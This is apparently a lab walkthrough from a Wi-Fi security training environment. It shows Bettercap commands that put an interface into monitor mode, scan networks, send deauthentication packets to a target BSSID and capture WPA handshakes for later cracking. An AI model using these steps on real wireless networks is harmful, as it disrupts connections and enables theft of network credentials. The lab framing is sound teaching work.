# Summary
In this lab we aim to learn more and become more familiarized with Bettercap.

# A Deeper Dive Into Bettercap
Select "Bettercap Wifi Auth Capture" from the menu. Allow up to 30 seconds to initialize the network. 

![[02-main-menu.png]]

*Note: normally, when using Bettercap with physical network cards, it is necessary to use `airmon-ng check kill` to kill processes that may interfere with Bettercap. However, running this command in the mininet-wifi network is unnecessary and may cause the environment to fail.*

Start by setting the interface `Attacker-wlan0` into monitor mode to analyze the wireless spectrum around us.

```bash
airmon-ng start Attacker-wlan0
```

If the following prompt appears, input "**y**" and hit enter. 

![[01-rfkill-error.png]]

Successful initialization will appear as pictured below.

![[01-monitor-enabled.png]]

Verify that the interface has been put into monitor mode using the following command:

```bash
iwconfig
```

As pictured below, the interface `wlan0mon` should now be present in monitor mode.

![[01-iwconfig.png]]

Launch Bettercap with the following command. 

```bash
bettercap -iface wlan0mon
```

You will be greeted by a prompt of with the name of the network interface. 

![[01-bettercap-1.png]]

Access the help menu by typing: 

```
help
```

Read this to get a better understanding of the tool. 

![[02-bettercap-help.png]]

This lab uses Bettercap's Wi-Fi module. Type the following to view a help menu specific to this module: 

```
help wifi
```

![[02-bettercap-wifi-help.png]]

Configure the console for a more convenient way to view your attack. 

```bash
set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
set wifi.show.sort clients desc
```

After running the commands, you should see the following on your screen. 

![[01-bettercap-1.png]]

Set the handshakes file.

```bash
set wifi.handshakes.file /Wifi-Forge/Framework/loot/4whs
```

Finally, enable Wi-Fi recon:

```bash
wifi.recon on
```

Data regarding local networks will fill your screen. Bettercap may take up to a minute to discover all the networks in the lab. 

Force the interface to focus on networks operating on channel 6. 

```bash
wifi.recon.channel 6
```

Send deauth packets:

```
wifi.deauth 76:df:71:67:40:2b
```

Bettercap will display the number of handshakes it captures. Wait until at least one handshake is captured. 

![[02-handshake-captured.png]]

Disable the Wi-Fi recon module:

```bash
wifi.recon off
```

Note: If this invocation produces an error about setting TX power, see the notes section of this lab. 

Disable console logging using the following command. Note that the monitor interface has not stopped channel hopping. 

```bash
events.stream off
```

Your final packet count may differ from the screenshot above. Note the BSSID of CORP_NET before killing bettercap - you'll need it for the next lab! If you need to re-scan networks run `wifi.recon on`. 

Type ```exit``` to leave bettercap. Use the main_menu command to return to the main menu and onto the next lab. 

NEXT LAB: [[Lab 03 - Packet Capture to HCCAPX Conversion and Hashcat Cracking]]